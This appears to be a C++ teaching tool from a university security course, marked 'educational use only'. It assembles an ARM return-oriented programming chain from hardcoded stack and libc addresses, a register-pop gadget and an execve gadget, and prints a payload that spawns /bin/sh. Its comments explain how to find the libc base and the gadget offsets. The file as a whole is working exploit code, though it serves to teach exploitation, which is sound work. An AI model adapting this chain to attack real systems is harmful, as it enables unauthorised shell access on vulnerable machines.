/*
 Tool to bake a functional ROP gadget for ARM

 Orion Lawlor, lawlor@alaska.edu, 2020-11-23 (educational use only)
*/
#include <stdio.h>
#include <vector>

// This is the address in memory where our stack landed
long stack_top=0xbefff454;
long stack_offset=0x14; // jump from stack top to our data

// This is the address where libc's r-xp code area starts in memory
//  You can get this from /proc/<pid>/maps, or a data leak.
long libc_base=0xb6d5a000;

/*
This is the libc-relative offset to our "pop_registers" gadget
You can find these gadgets by disassemblying libc using objdump -dr
  a5974:       bd07            pop     {r0, r1, r2, pc}
*/
long gadget_pop=0xa5974+1; // +1 for "thumb" mode on ARM

/*
This is the libc-relative offset to our "execve" gadget
00073ba0 <execve@@GLIBC_2.4>:
   73ba0:       b480            push    {r7}
   73ba2:       f04f 070b       mov.w   r7, #11
   73ba6:       df00            svc     0
*/
long gadget_execve=0x73ba2+1;


int main() {
	std::vector<long> rop; // stack contents go here

	// Top of the stack: pop gadget
	rop.push_back(libc_base+gadget_pop);

	// This will pop  {r0, r1, r2, pc}
	rop.push_back(stack_top+stack_offset); // r0 = address of "/bin/sh"
	rop.push_back(0); // r1 = argv, zero for none
	rop.push_back(0); // r2 = envp, zero for none

	// Next entry in rop chain: execv gadget
	rop.push_back(libc_base+gadget_execve);

	// We put our string data down here
	rop.push_back(0x6e69622f); // == ASCII "/bin"
	rop.push_back(0x0068732f); // == ASCII "/sh" and terminator

	// Print the gadget!
	for (int i=0;i<(int)rop.size();i++)
		printf("0x%lx ",rop[i]);
	printf(" stop\n");

	return 0;
}

